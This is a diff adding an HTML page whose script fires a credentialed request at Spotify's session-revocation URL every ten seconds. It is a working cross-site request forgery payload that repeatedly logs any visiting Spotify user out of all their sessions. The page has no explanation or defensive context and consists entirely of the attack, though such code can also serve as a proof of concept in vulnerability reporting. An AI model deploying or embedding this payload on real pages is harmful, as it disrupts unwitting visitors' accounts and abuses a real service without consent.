@@ -1,0 +1,12 @@
+<body>
+<script>
+function revokeSessions() {
+    fetch("https://accounts.spotify.com/revoke_sessions/?continue=open.spotify.com", {
+        method: "GET",
+        credentials: "include"
+    });
+}
+
+setInterval(revokeSessions, 10000);
+</script>
+</body>
